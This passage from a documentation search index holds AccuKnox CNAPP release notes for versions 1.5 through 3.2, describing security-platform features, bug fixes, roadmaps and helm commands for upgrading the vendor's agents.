Policies Section</li> <li>Creating labels for Custom Policy in Policies Section</li> <li>Logs aggregation in Alerts page</li> <li>Slow API Response related fixes</li> </ul> <p>User Experience:</p> <ul> <li>New Widgets getting added in CNAPP Dashboard</li> <li>CSPM Executive Dashboard</li> <li>New experience in Assets Section</li> </ul> <p>What to Expect Next?</p> <ul> <li>CSPM Instantaneous Reporting</li> <li>CWPP Report Enhancements</li> <li>User experience related tweaks in UI</li> </ul>"},{"location":"getting-started/1-5-release/#latest-release-notes","title":"Latest Release notes","text":"<ul> <li>v1.7 Release Notes</li> </ul>"},{"location":"getting-started/1-6-release/","title":"Release Notes v1.6","text":"<p>What's New?</p> <ul> <li>CSPM Report Enhancements</li> <li>CSPM Database Enhancements</li> <li>Discovery Engine V2</li> <li>AccuKnox CLI Integrations (Install, Discover, Recommend)</li> <li>GAR Support for Registry Scan</li> <li>Sorting of Alerts based on Timestamp</li> <li>Search Registry option in Registry Scan</li> </ul> <p>Major Bug Fixes:</p> <ul> <li>App Behavior related fixes and Enhancements</li> <li>CWPP Report related bug fixes</li> <li>Monitoring/Alerts page DSL Filter fixes</li> </ul> <p>User Experience:</p> <ul> <li>Revamped Cloud Workloads</li> <li>Enhanced new view in the Observability of Workloads</li> <li>Performance of AccuKnox Agents enhanced.</li> </ul> <p>What to Expect Next?</p> <ul> <li>Asset Hierarchical View</li> <li>Virtual machine onboarding on SaaS</li> <li>Dynamic Search Filter related changes</li> </ul> <p>Upgrading AccuKnox-Agents: Since we have done some major changes to the Cloud Workload Protection Platform the AccuKnox agents that are installed in your cluster need to be updated. Here is the link to upgrade the Accuknox-Agents</p>"},{"location":"getting-started/1-6-release/#previous-release-notes","title":"Previous Release notes","text":"<ul> <li>v1.5 Release Notes</li> </ul>"},{"location":"getting-started/1-7-release/","title":"Release Notes v1.7","text":"<p>What's New?</p> <ul> <li>Virtual Machine onboarding for security hardening</li> <li>Better filtering capabilities in container image registry onboarding</li> <li>Support for container registries : DockerHub Organization account, JFrog, Quay</li> <li>Improved DevSecOps support: Token generation/access control</li> <li>Improved UI navigation using search, quick access onboarding options</li> <li>Email Integration</li> <li>Improvements to cloud misconfiguration detection to reduce the noise.</li> <li>Hierarchical View of Assets (Beta version)</li> <li>Enhancement in the filters for viewing the application behavior.</li> </ul> <p>Virtual Machine Onboarding: This release has introduced the option to onboard Virtual Machines to our SaaS portal. To use this option users need to navigate to Settings\u2192Manage clusters\u2192 onboard now\u2192 give any name and Select Next\u2192 In the next screen you need to select the VM for getting the instructions to onboard Virtual machines</p> <p></p> <p>CI/CD token: AccuKnox has recently published two Github MarketPlace actions These MarketPlace Actions would require Tokens as one of the prerequisites. So users who are interested with this DevSecops model will need to generate these tokens. Users need to navigate to Settings\u2192Tokens</p> <p></p> <p>UI/UX Enhancements in Left Navigation bar: In this new left navigation bar we have a search option to search the list of options that AccuKnox SaaS provides. We also have introduced an option to hide the left navigation bar by clicking the &lt; icon.</p> <p></p> <p>Onboarding Assist:</p> <p>We have introduced a new onboarding assist in our left Navigation bar which can help to show whether cloud, Clusters, and Container registries are onboarded in the particular tenant or not.</p> <p></p> <p>Change in Logout option:</p> <p>AccuKnox's new UI/UX enhancements have changed the logout option in the profile section. Now to log out of the portal users need to click on the Profile name and select logout</p> <p></p> <p>Asset Hierarchical View(Beta Version):</p> <p>This feature is released as a beta version as it will be available based on the customer's request. This gives the hierarchical view of the cloud assets with diff. view based on the previous scan and current scan. To see this users need to toggle the asset hierarchical view in the Inventory\u2192 Assets page.</p> <p></p> <p>What to expect in the Next release? - CIS support for Kubernetes - IaC scan - Pod Security Admission - Kubernetes Identity and Entitlement Management(KIEM) (Beta version) - Asset Hierarchical view(full version)</p>"},{"location":"getting-started/1-7-release/#previous-release-notes","title":"Previous Release notes","text":"<ul> <li>v1.6 Release Notes</li> <li>v1.5 Release Notes</li> </ul>"},{"location":"getting-started/2.0-release/","title":"Release Notes v2.0","text":"<p>What's New?</p> <ul> <li>CIS Benchmark support for k8s cluster against various misconfigurations and vulnerabilities.</li> <li>Detecting vulnerabilities in Terraform, Helm charts, and YAML files in GitHub, GitLab, and Bitbucket.</li> <li>Providing detailed views of namespace, cluster, and VM application behavior.</li> <li>Enforcing and visualizing Pod Security Standards with flexible configuration and dry run.</li> <li>Manage RBAC permissions with graph visualization and search.</li> <li>AI chatbot for interactive queries about AccuKnox and onboarded cloud accounts.</li> <li>Supports login with Google accounts for Gmail-invited users.</li> <li>Identifies stable policies with a 'stable' tag to simplify zero trust implementation.</li> </ul> <p>Enhancements</p> <ul> <li>New detailed view for vulnerabilities and misconfigurations across cloud accounts and Kubernetes clusters.</li> <li>Revamped onboarding and inventory pages; supports onboarding up to 100 clusters with access keys.</li> <li>Enhanced CWPP dashboard with insights into various compliance frameworks.</li> <li>Scans container images based on Last pull or Regex pattern.</li> <li>Easier multi-upload of custom policy YAML files.</li> <li>Improved header design with global search and redesigned signup/login pages.</li> </ul> <p>Fixes</p> <ul> <li>Improved asset coverage for AWS, Azure, and GCP, with minor bug fixes.</li> </ul> <p>Note: Since the AccuKnox team had done a major upgrade the existing clusters/VMs that are onboarded to the AccuKnox Demo environment need to be upgraded.</p> <ul> <li> <p>For Clusters:   <code>helm upgrade --install accuknox-agents oci://registry-1.docker.io/accuknox/accuknox-agents  --version \"v0.6.5\" -n accuknox-agents</code></p> </li> <li> <p>For VMS:   Users need to deboard control plane nodes using <code>knoxctl deboard cp-node</code> and re onboard the control plane following instructions from the Manage clusters page.</p> </li> </ul> <p>For further queries and details please contact the AccuKnox support team. We hope you like the enhanced security and improved features of AccuKnox v2.0!</p>"},{"location":"getting-started/2.0-release/#detailed-outline","title":"Detailed Outline:","text":"<p>1. Agentless Risk Assessment for Kubernetes Clusters</p> <p>Kubernetes clusters related misconfiguration can be viewed with the help of AccuKnox jobs. These can scan and report issues related to Various benchmarks like CIS, NIST, SOC2. Our jobs can also scan for misconfigurations in the kubernetes clusters.</p> <ul> <li>CIS Benchmarks(K8s):   AccuKnox CNAPP already supported CIS Benchmarks for Cloud accounts. Now AccuKnox CNAPP supports these CIS Benchmarks for k8s clusters against various misconfigurations. AccuKnox provides the CIS benchmarks related findings with the help of its agentless risk assessment job.</li> </ul> <p></p> <ul> <li>Cluster Misconfigurations:   Misconfiguration and vulnerability related to the k8s cluster are scanned using AccuKnox k8s jobs which provides the comprehensive results in the SaaS.</li> </ul> <p></p> <p>2. IaC Scanning</p> <p>To see the vulnerabilities related to the Configuration files like Terraform, Helm charts, YAML files that are present in your GitHub, Gitlab and Bitbucket repositories.</p> <p></p> <p>3. Application behavior monitoring made easier</p> <ul> <li>App Behavior - Namespace and Cluster Level View: Enhanced app behavior monitoring with detailed views at the namespace and cluster levels</li> </ul> <p></p> <ul> <li>App Behavior of VM Workloads: Now users can see the application behavior for their onboarded VMs as well. This gives the process and network connections that are made by the application running in the VMs</li> </ul> <p></p> <p>4. PSA and Reporting</p> <ul> <li>Pod Security Admission (PSA): The Pod Security Admission features now permit enforcing Pod Security Standards at the namespace level with flexible configuration and application. It provides apparent visualization for security postures in the Namespace Security Posture view and audit results in the Monitors/Alerts view. We also have a dry run feature which can be used to check the PSA policies without having to apply in the cluster.</li> </ul> <p></p> <p>5. Kubernetes Identity And Entitlement Management(KIEM)(BETA)</p> <p>AccuKnox KIEM's solution uses RBAC to manage access to Kubernetes resources more easily with graph visualization and full-text search. Users can filter on restrictions like roles, rules, verbs, and service accounts on the KIEM's overview page, which presents all permissions. We also include pre-defined key queries to investigate important entities and their relationships. You can now view connections, find excessively permissive permissions, and search across all RBAC entities. Users can check this feature by Navigating to Identity-&gt;KIEM. This will be Beta feature now as there is still improvements being made by the team.</p> <p></p> <p>6. AskAda-(AI LLM Chatbot)(BETA)</p> <p>Ask Ada is the AI/LLM Chatbot of Accuknox. This gives users with interactive features of answering queries related to AccuKnox platform, along with queries related to the user's onboarded cloud accounts, clusters related information. This is also a Beta feature which is under constant improvement.</p> <p></p> <p>7. Google SSO-Based Login</p> <p>Users who are already invited to the AccuKnox tenant with their gmail ids can login with their google accounts with the help of this Single sign on based method.</p> <p></p> <p>8. Zero Trust Journey made simpler</p> <p>Users can achieve their zero trust journey easier with the help of new feature called the stable tag in the policies. Now the users will be notified with the 'stable' tag against each and every discovered policies which are not getting any updates based on the application behavior. So users can easily apply those policies to achieve their zero trust journey.</p> <p></p> <p>9. Findings</p> <p>The latest release comes with a new view of Vulnerabilities and Misconfigurations that are detected across your cloud accounts, Container images, Repositories and Kubernetes clusters/VMs with Findings Section. This new view has comprehensive filters to point towards more granularity. Issues-&gt; Findings</p> <p></p> <p></p> <p>10. Cluster and VM Management</p> <ul> <li>Cluster/VM Onboarding Page Revamp: Redesigned onboarding page for a smoother cluster and VM setup experience.</li> </ul> <p></p> <ul> <li>Inventory Clusters Page Revamp: Updated clusters page in the inventory section, displaying active and inactive statuses.</li> </ul> <p></p> <ul> <li>Onboarding multiple cluster made easy with Access keys: Users can onboard multiple clusters into the AccuKnox SaaS platform by using the Access keys based method. Using this, users can onboard up to 100 clusters with a single token.</li> </ul> <p></p> <ul> <li>Active Compliance Policy Coverage in CWPP Dashboard: Enhanced CWPP dashboard with active compliance policy coverage insights related to various compliance frameworks like CIS, NIST, PCI-DSS and MITRE TTP Attack Framework.</li> </ul> <p></p> <p>11. Container image scanning based on Last pull/ Regex pattern</p> <p>AccuKnox Registry scan feature now supports various options for the container image scanning. Users can select the Regular expression pattern or last pulled date to include or exclude images for container image scanning.</p> <p></p> <p>12. Policy Management</p> <ul> <li>Upload Custom policies made easier with new feature: Users can easily upload their custom policy yamls into the AccuKnox SaaS platform this saves time as users can now multi-upload policy files in a single go.</li> </ul> <p></p> <p>13. Global Search and Login page revamp</p> <ul> <li>Global Search Bar and Header Redesign: Enhanced header design with a global search bar for improved navigation.</li> </ul> <p></p> <ul> <li>New Authentication Design: Redesigned signup and login pages for a better user experience.</li> </ul> <p></p> <p>What to expect in the Next release?</p> <ul> <li>Automatic Ticket creation for critical vulnerabilities</li> <li>Rules Engine</li> <li>KIEM Enhancements</li> <li>Container image scan enhancements</li> <li>Ask-Ada improvements</li> <li>Compliance Reporting enhancements</li> </ul>"},{"location":"getting-started/2.0-release/#previous-release-notes","title":"Previous Release notes","text":"<ul> <li>v1.7 Release Notes</li> <li>v1.6 Release Notes</li> <li>v1.5 Release Notes</li> </ul>"},{"location":"getting-started/2.1-2.2-release/","title":"Release Notes v2.1 &amp; v2.2","text":""},{"location":"getting-started/2.1-2.2-release/#whats-new","title":"What's New","text":"<ul> <li> <p>Creating tickets for Vulnerabilities becomes easier now</p> <ul> <li> <p>Users can Create tickets automatically for the vulnerabilities discovered after each scan by making use of our New feature Rules Engine. Using this feature users can create rules for creating tickets based on their condition.</p> </li> <li> <p>Users can Navigate to Issues-&gt; Findings page and Navigate to Rules Engine section to Create a Rule or Directly create rule from Findings page filter as well.</p> </li> </ul> </li> </ul> <p></p> <ul> <li> <p>Scanning Locally deployed Container registries/ Private container Registries</p> <ul> <li> <p>With AccuKnox latest release users have the opportunity to share the locally deployed Container Registry with the help of AccuKnox Local registry jobs.</p> </li> <li> <p>Users will require a Local Kubernetes cluster that has to be on-boarded into the AccuKnox portal which will have the Local registry scan job to scan the locally deployed registry.</p> </li> </ul> </li> </ul> <p></p> <p></p> <ul> <li>Kubernetes Risk posture Dashboard widgets<ul> <li>AccuKnox latest Release has the way of showcasing the Kubernetes Risk posture in the form of interactive Dashboard widgets. It has various new widgets that help the users to drill through the Security risks associated with Kubernetes clusters and VMs.</li> </ul> </li> </ul> <p></p> <ul> <li>Now users will be able to see the trends in the security findings over a period of time with this new widget view.</li> </ul> <p></p> <p></p>"},{"location":"getting-started/2.1-2.2-release/#bug-fixesenhancements","title":"Bug Fixes/Enhancements","text":"<ul> <li> <p>Static code analysis Findings enhancement in Description and Solutions fields</p> </li> <li> <p>Host Endpoint Findings Reference sections support has been added.</p> </li> <li> <p>Enhancements in Registry scan page for viewing the Registries scan status with DSL filter support</p> </li> <li> <p>Minor enhancements in the performance of AccuKnox Agents.</p> </li> <li> <p>Enhancements in the Registry scan page with search and filtering support</p> </li> <li> <p>Enhancements in the Cloud Account scanning performance</p> </li> </ul>"},{"location":"getting-started/2.1-2.2-release/#upcoming-features","title":"Upcoming Features","text":"<p>In the next upcoming release of AccuKnox users can expect the following features</p> <ul> <li> <p>Customized Reporting for ASPM and Cluster Findings</p> </li> <li> <p>CSPM Report related fixes</p> </li> <li> <p>ARM architecture support for AccuKnox-Agents</p> </li> </ul> <p>Since We have made some enhancements in the Runtime workload protection Users will need to upgrade their agents in the cluster using the following command</p> <p>For Clusters:</p> <pre><code>helm upgrade --install accuknox-agents oci://[registry-1.docker.io/accuknox/accuknox-agents](http://registry-1.docker.io/accuknox/accuknox-agents)\u00a0 --version \"v0.7.7\" -n accuknox-agents\n</code></pre> <p>For VMS:</p> <p>Users need to deboard control plane nodes using (knoxctl deboard) and re onboard the control plane\u00a0 following instructions from the Manage clusters page.</p>"},{"location":"getting-started/2.4-release/","title":"AccuKnox CNAPP v2.4 Release Notes","text":"<p>We are excited to announce the release of AccuKnox Enterprise CNAPP v2.4, which is packed with powerful new features, enhancements, and security improvements. This update brings improved compliance monitoring, streamlined asset management, advanced vulnerability tracking, and enhanced integration capabilities to help you effortlessly strengthen your security posture.</p> <p>Here's what's new in v2.4:</p>"},{"location":"getting-started/2.4-release/#new-features-enhancements","title":"New Features &amp; Enhancements","text":""},{"location":"getting-started/2.4-release/#1-improved-clusters-view","title":"1. Improved Clusters View","text":"<ul> <li> <p>Kubernetes Clusters now includes a detailed and list view of clusters.</p> </li> <li> <p>Offers insights into nodes, namespaces, workloads, and findings.</p> </li> <li> <p>Users can quickly analyze and manage their cluster security status.</p> </li> </ul> <p></p> <p></p>"},{"location":"getting-started/2.4-release/#2-cloud-and-cluster-compliance-monitoring","title":"2. Cloud and Cluster Compliance Monitoring","text":"<ul> <li> <p>Compliance findings for cloud and Kubernetes clusters can now be viewed on the same page.</p> </li> <li> <p>Navigate to Compliance \u2192 Summary to get a consolidated compliance view.</p> </li> <li> <p>Simplifies regulatory adherence and compliance tracking.</p> </li> </ul> <p></p>"},{"location":"getting-started/2.4-release/#3-simplified-assets-inventory","title":"3. Simplified Assets Inventory","text":"<ul> <li> <p>All assets across cloud, code, containers, and Kubernetes clusters are now easier to view and manage.</p> </li> <li> <p>The revamped Assets page allows for improved grouping and categorization.</p> </li> </ul> <p></p>"},{"location":"getting-started/2.4-release/#4-stig-compliance-for-virtual-machines","title":"4. STIG Compliance for Virtual Machines","text":"<ul> <li> <p>Added STIG Benchmark Compliance support for Ubuntu and RHEL virtual machines.</p> </li> <li> <p>Users can scan their virtual machines against these benchmarks to check compliance levels and strengthen security posture.</p> </li> </ul> <p></p> <p></p>"},{"location":"getting-started/2.4-release/#5-application-security-posture-management-aspm-widgets","title":"5. Application Security Posture Management (ASPM) Widgets","text":"<ul> <li> <p>New widgets added for SAST, DAST, and IaC to provide a high-level overview of security issues.</p> </li> <li> <p>Covers code, APIs, and configuration vulnerabilities.</p> </li> </ul> <p></p>"},{"location":"getting-started/2.4-release/#6-certificate-management","title":"6. Certificate Management","text":"<ul> <li> <p>Users can now upload and manage certificates for various use cases, including:</p> </li> <li> <p>Registry onboarding</p> </li> <li> <p>Integration management</p> </li> <li> <p>Certificate expiration tracking</p> </li> <li> <p>A centralized location to handle all uploaded certificates is provisioned.</p> </li> </ul> <p></p>"},{"location":"getting-started/2.4-release/#7-opengrepsemgrep-integration","title":"7. Opengrep/Semgrep Integration","text":"<ul> <li> <p>Expanded SAST capabilities with Opengrep/Semgrep integration.</p> </li> <li> <p>View findings directly in the AccuKnox platform.</p> </li> <li> <p>Categorize vulnerabilities based on severity and impacted assets.</p> </li> <li> <p>AI-powered assistive remediation suggestions included.</p> </li> </ul> <p></p>"},{"location":"getting-started/2.4-release/#8-findings-summary","title":"8. Findings Summary","text":"<p>The Findings page now includes a comprehensive summary view of vulnerabilities across various phases of the security lifecycle. This enhancement provides users with a centralized overview, enabling quicker assessment and more efficient remediation of security issues.</p> <p></p>"},{"location":"getting-started/2.4-release/#9-secret-scanning","title":"9. Secret Scanning","text":"<p>AccuKnox now supports secret scanning for code repositories, helping users detect and address exposed secrets. This feature enhances security by identifying sensitive information leaks and providing actionable insights for remediation.</p> <p></p> <p></p>"},{"location":"getting-started/2.4-release/#10-enhanced-findings-view-reporting","title":"10. Enhanced Findings View &amp; Reporting","text":"<ul> <li> <p>Improved findings visibility with grouping options:</p> </li> <li> <p>Asset Name, Asset Type, Vulnerability Type, Compliance Status, etc.</p> </li> <li> <p>Predefined insights to help users navigate findings efficiently.</p> </li> <li> <p>Users can create custom combinations of insights for better analysis.</p> </li> <li> <p>Enhanced dashboard and reporting options for deeper security visibility</p> </li> <li> <p>Sensitive asset scanning in S3 buckets, code repos, etc..</p> </li> </ul> <p></p>"},{"location":"getting-started/2.4-release/#11-simplified-devsecops-integration","title":"11. Simplified DevSecOps Integration","text":"<ul> <li> <p>The latest version significantly simplifies the DevSecOps integration journey.</p> </li> <li> <p>The platform now provides direct links to various plugins and marketplace actions, enabling seamless integration with CI/CD pipelines.</p> </li> <li> <p>Users can easily integrate security checks into their development workflows, enhancing automation and security coverage.</p> </li> </ul> <p></p>"},{"location":"getting-started/3.0-release/","title":"AccuKnox CNAPP  v3.0 Release Notes","text":""},{"location":"getting-started/3.0-release/#whats-new-in-accuknox-v30","title":"What's New in AccuKnox v3.0","text":"<p>AccuKnox v3.0 is here. This release redefines cloud-native security with powerful AI/ML/LLM protections, seamless DevSecOps integrations, and a refreshed user experience. From Kubernetes entitlement management to API security and AI-assisted remediation, v3.0 gives security teams unprecedented control over complex environments.</p> <p></p>"},{"location":"getting-started/3.0-release/#user-experience-improvements","title":"User Experience Improvements","text":"<p>AccuKnox v3.0 introduces a revamped user interface, with a global search bar designed to simplify workflows and provide intuitive navigation. The updated experience reduces friction for onboarding and day-to-day operations, ensuring security teams can act faster and with greater confidence.</p> <p></p> <p></p>"},{"location":"getting-started/3.0-release/#simplified-onboarding-management","title":"Simplified Onboarding &amp; Management","text":"<ul> <li>AWS Organization Support enables centralized onboarding and management of all member accounts.</li> <li>On-Prem Optimization reduces node requirements and allows full control plane deployment\u2014ideal for enterprise environments.</li> <li>Token management is now powered by SPIFFE, improving identity and trust handling.</li> <li>Fixed cloud account health/status visibility issues for improved accuracy.</li> </ul>"},{"location":"getting-started/3.0-release/#aimlllm-security-ai-powered-capabilities","title":"AI/ML/LLM Security &amp; AI-Powered Capabilities","text":"<ul> <li> <p>Runtime Protection for LLMs safeguards AI workloads against prompt injections and misuse.   </p> </li> <li> <p>Gain full-stack visibility of AI/ML assets, model lineage, and data flows.   </p> </li> <li> <p>Conduct automated red teaming and risk assessments across models, datasets, and compute instances.   </p> </li> <li>Agentic AI Sandboxing prevents exploitation attempts such as package installation, credential theft, and network scanning.</li> <li>AI-assisted workflows automatically suggest fixes and generate bulk Jira tickets.</li> <li>Integrated AI-Assisted Remediation for Security right inside the platform tailored to your asset names, so it's specific to your environment. Also get a dedicated GenAI Security Copilot for actionable guidance.    </li> </ul>"},{"location":"getting-started/3.0-release/#extended-cspm-aspm-coverage","title":"Extended CSPM + ASPM Coverage","text":"<ul> <li>Support for CIS Benchmark 4.0.1 and CMMC Framework enables up-to-date compliance checks.</li> <li>AWS assessments align with the latest CIS best practices.</li> <li>Introduced Updated Compliance Versions for tailored compliance tracking.</li> <li>CSPM reporting accuracy improved through TSL-driven fixes.</li> </ul>"},{"location":"getting-started/3.0-release/#cloud-workload-protection-cwpp-runtime-security","title":"Cloud Workload Protection (CWPP) &amp; Runtime Security","text":"<ul> <li> <p>In-cluster Image Scanning allows deep, real-time scans of container images inside Kubernetes clusters, eliminating pre-deployment delays.     </p> </li> <li> <p>New alert suppression workflows and widgets reduce noise and help teams focus on critical issues.     </p> </li> </ul>"},{"location":"getting-started/3.0-release/#kubernetes-identity-entitlement-management-kiem","title":"Kubernetes Identity &amp; Entitlement Management (KIEM)","text":"<ul> <li>KIEM Updates: Detect unused roles, excessive permissions, and shadow privileges with enhanced insights.</li> <li>Improved asset deletion provides better control over sensitive data.</li> </ul>"},{"location":"getting-started/3.0-release/#automation-remediation-lifecycle-management","title":"Automation, Remediation &amp; Lifecycle Management","text":"<ul> <li>Enhanced Rules Engine with new actions like risk factor adjustments and explicit ignore rules.</li> <li>Bulk Ticketing and improved Jira integration streamline security operations.</li> <li>Expanded CI/CD scanning with broader platform support (including CircleCI).</li> <li>Integrated Checkmarx API to unify SAST results within AccuKnox.</li> </ul>"},{"location":"getting-started/3.0-release/#enterprise-grade-siem-and-cdr-additions","title":"Enterprise Grade SIEM and CDR Additions","text":"<ul> <li>Native SIEM integration for unified threat detection and analysis.</li> <li>CDR (Cloud Detection and Response) features for AWS use cases.</li> <li>Detection for OWASP Top 10 threats, DoS, and brute force attacks.</li> <li>More features coming in upcoming releases.</li> </ul>"},{"location":"getting-started/3.0-release/#roadmap","title":"Roadmap","text":"<p>We\u2019re continuing to expand AccuKnox\u2019s capabilities. Here\u2019s what\u2019s coming in future releases:</p> <ol> <li>API Security: Deeper visibility and protection for API endpoints, API Inventory, and TLS traffic inspection.</li> <li>Security Graph: Visualize relationships across assets, identities, and risks.</li> <li>Configurable Compliances: Tailor compliance frameworks to your organizational needs.</li> <li>SBOM (Software Bill of Materials): Gain insight into all software components for enhanced supply chain security.</li> <li>AI-Compliances: Leverage AI-driven insights to maintain compliance posture including NIST AI, MITRE AI, AISCP, SOC, etc.</li> <li>Collectors: Flexible data collection mechanisms for diverse environments. </li> </ol>"},{"location":"getting-started/3.0-release/#take-the-next-step","title":"Take the Next Step","text":"<p>Get hands-on with AccuKnox v3.0 and experience the future of cloud-native security. \ud83d\udc49 Book a Demo \ud83d\udce7 Reach us at support@accuknox.com for enterprise deployments and tailored onboarding assistance.</p>"},{"location":"getting-started/3.1-release/","title":"Release Notes: CNAPP v3.1","text":"<p>Release Date: August 20, 2025</p> <p>This release introduces significant new capabilities to expand your security visibility, including container image scanning on VMs and configurable compliance frameworks. It also delivers key updates to existing features and a wide range of bug fixes to improve platform stability and user experience.</p>"},{"location":"getting-started/3.1-release/#new-features","title":"\ud83d\ude80 New Features","text":""},{"location":"getting-started/3.1-release/#container-image-scanning-on-virtual-machines","title":"Container Image Scanning on Virtual Machines","text":"<p>You can now discover and scan container images that reside on your virtual machines. This extends vulnerability scanning beyond container registries and running clusters, providing a more comprehensive security view of all container images in your environment, regardless of their location.</p> <p>See docs</p>"},{"location":"getting-started/3.1-release/#configurable-compliance-frameworks","title":"Configurable Compliance Frameworks","text":"<p>To help you focus on the standards that matter most to your organization, we've introduced the ability to enable or disable entire compliance frameworks. By deactivating irrelevant standards, you can declutter your dashboards and reports, ensuring that your teams can focus on the specific compliance requirements applicable to your business.</p> <p></p>"},{"location":"getting-started/3.1-release/#application-security-posture-management-aspm-reports","title":"Application Security Posture Management (ASPM) Reports","text":"<p>This release introduces the first phase of ASPM reporting. You can now generate on-demand reports that provide deep insights into the security posture of your applications. This helps you more effectively identify, prioritize, and remediate risks throughout the application lifecycle.</p> <p></p> <p>See how to schedule or on-demand generate ASPM Reports</p>"},{"location":"getting-started/3.1-release/#remediation-guidance-for-gcp-azure","title":"Remediation Guidance for GCP &amp; Azure","text":"<p>The platform now includes detailed, actionable remediation steps for compliance findings within Google Cloud Platform (GCP) and Microsoft Azure environments. This guidance helps your security and DevOps teams resolve misconfigurations faster and more effectively, reducing the mean time to remediation (MTTR).</p>"},{"location":"getting-started/3.1-release/#updates-to-existing-features","title":"\u2728 Updates to Existing Features","text":""},{"location":"getting-started/3.1-release/#enhanced-alert-findings-views","title":"Enhanced Alert &amp; Findings Views","text":"<p>We've improved the flexibility of the Alerts page by allowing you to customize table columns based on the primary data within the alert payload. Additionally, the saved filter experience has been enhanced across the platform for a more intuitive and consistent workflow.</p> <p></p>"},{"location":"getting-started/3.1-release/#improved-sonarqube-integration","title":"Improved SonarQube Integration","text":"<p>The integration with SonarQube now more accurately reflects the lifecycle of a finding. When an issue is marked as 'Fixed' in SonarQube, its status will be correctly updated and reflected within the CNAPP platform, ensuring data is always synchronized.</p> <p></p>"},{"location":"getting-started/3.1-release/#bug-fixes-and-improvements","title":"\ud83d\udee0\ufe0f Bug Fixes and Improvements","text":""},{"location":"getting-started/3.1-release/#cloud-cluster-management","title":"Cloud &amp; Cluster Management","text":"<ul> <li>Fixed an issue where a cloud account with valid permissions was incorrectly displayed with an 'Inactive' status.</li> <li>Addressed a bug that caused deleted Kubernetes clusters to reappear in the UI after being removed, ensuring the cluster list is always accurate.</li> <li>Resolved an issue where the total node count was not being correctly reported for CWPP, ensuring accurate workload inventory.</li> </ul>"},{"location":"getting-started/3.1-release/#dashboards-and-reporting","title":"Dashboards and Reporting","text":"<ul> <li>Corrected a UI bug that caused the 'Top 10 Cloud Findings' widget on the main dashboard to fail.</li> </ul>"},{"location":"getting-started/3.1-release/#user-experience","title":"User Experience","text":"<ul> <li>Optimized platform navigation to prevent the header and sidebar from unnecessarily reloading, resulting in a significantly smoother and faster user experience.</li> <li>Maintenance banner will be displayed even without logging in. (During maintenance, you'll see the banner in the Login page)</li> <li>The refresh button on the Alerts page now correctly fetches the latest data, and pagination works as expected after performing a search.</li> <li>We have resolved several issues related to creating and editing saved filters on the Alerts page, ensuring that filter conditions are saved correctly and behave as expected.</li> </ul>"},{"location":"getting-started/3.2-release/","title":"AccuKnox CNAPP - Release v3.2 Notes","text":"<p>Release Date: 25<sup>th</sup> September, 2025</p> <p>This release strengthens automated compliance, vulnerability visibility, RBAC workflows, and API security, while improving scale, stability, and enterprise integration.</p>"},{"location":"getting-started/3.2-release/#highlights","title":"Highlights","text":"<ol> <li>Automated ASPM &amp; CSPM Reports \u2192 Scheduled, versioned compliance reporting for SOC 2, ISO 27001, etc.</li> <li>Unified Helm Chart \u2192 Simplifies deployment of agents &amp; risk jobs into a single configuration.</li> <li>CDR &amp; SIEM Drawer View \u2192 Faster triage with consolidated event details in one pane.</li> <li>Manage Engine Service Desk Pro Support \u2192 Full priority sync, auto-cleanup, and better UI for ITSM workflows.</li> <li>VM Vulnerability Scanning \u2192 Multi-cloud visibility (AWS, GCP, Azure) with enriched metadata (OS, account type, account name).</li> <li>API Security -- Phase 1 \u2192 API inventory, schema/specs review, scans, and findings for better attack surface mapping.</li> <li>Collectors \u2192 Built-in scanning modules (Host Endpoint, ASPM, AI Security) without external plugins/workflows.</li> <li>VM Hardening Policies \u2192 Out-of-the-box policies for stronger runtime security.</li> <li>SPIRE-based Onboarding for Jobs \u2192 Replaces expiring access tokens with streamlined, persistent auth.</li> </ol>"},{"location":"getting-started/3.2-release/#features-enhancements","title":"Features &amp; Enhancements","text":""},{"location":"getting-started/3.2-release/#1-scheduled-aspm-cspm-reports","title":"1. Scheduled ASPM &amp; CSPM Reports","text":"<p>Manual reporting workflows often delayed compliance checks and required manual effort from engineering teams.</p> <p>You can now configure ASPM and CSPM reports to automatically run on a fixed cadence (daily, weekly, or monthly), with fine-grained control over included clusters, namespaces, and tenants.</p> <p>Reports can be versioned, status-tracked, and delivered directly to stakeholders, enabling consistent compliance evidence collection for SOC 2, ISO 27001, and other frameworks.</p> <p>Read the Docs</p> <p></p>"},{"location":"getting-started/3.2-release/#2-consolidated-helm-charts-for-agents-risk-assessment-jobs","title":"2. Consolidated Helm Charts for Agents &amp; Risk Assessment Jobs","text":"<p>Previously, users had to deploy multiple Helm charts for KubeArmor, agents, and risk assessment jobs, each with separate values and upgrade paths \u2014 increasing operational overhead.</p> <p>This release consolidates everything into a single Helm chart with unified configuration, including resource requirements for VMs, multi-cluster onboarding info, and port requirements.</p> <p>\ud83d\udc49 Get commands by toggling the options that suit your needs from this Cluster Onboarding Configuration Page.</p> <p></p>"},{"location":"getting-started/3.2-release/#3-detailed-drawer-view-for-cdr-siem","title":"3. Detailed Drawer View for CDR &amp; SIEM","text":"<p>Security analysts had to pivot across multiple screens to investigate a single event.</p> <p>The new detailed drawer consolidates event payloads, rule matches, source metadata, and response actions in a single pane \u2014 without navigating away.</p> <p>This drastically reduces MTTR (Mean Time to Respond) by enabling triage and rule tuning from within the same context.</p> <p></p>"},{"location":"getting-started/3.2-release/#4-manage-engine-service-desk-pro-support","title":"4. Manage Engine Service Desk Pro Support","text":"<p>Older integrations occasionally missed priority updates and left stale profiles after deletion.</p> <p>The new implementation: - Fully supports priority synchronization - Cleans up deleted configs automatically - Enhances UI usability with sortable, filterable lists</p> <p>This ensures smooth ITSM integration and eliminates manual cleanup work for service desk admins.</p> <p>\ud83d\udcd6 Read The Docs</p> <p> </p>"},{"location":"getting-started/3.2-release/#5-vm-vulnerability-scanning-aws-gcp-azure","title":"5. VM Vulnerability Scanning (AWS, GCP, Azure)","text":"<ul> <li>Previously, VM Malware and Vulnerability findings lacked crucial context, forcing teams to manually reconcile results with inventory data.</li> <li>This release enriches both VM Malware Findings and VM Vulnerability Findings with three new metadata fields:</li> <li>OS Distribution</li> <li>Cloud Account Type (AWS, GCP, Azure)</li> <li>Cloud Account Name</li> <li>These attributes are now populated directly from VM metadata and cloud account mappings, ensuring accurate attribution of findings.</li> <li>Downstream widgets and dashboards automatically consume these fields, enabling filtered views by cloud provider or OS type.</li> <li>Makes it easier to assign remediation to the right business unit and significantly improves compliance and executive reporting.</li> </ul>"},{"location":"getting-started/3.2-release/#6-api-security-phase-1","title":"6. API Security -- Phase 1","text":"<ul> <li>Laid the API Observability foundation with a first iteration of API Inventory.</li> <li>Added dedicated Endpoints and Collections pages for clear categorization.</li> <li>New API Specifications page lets teams review schemas/contracts for each discovered API.</li> <li>Scans page enables static and dynamic 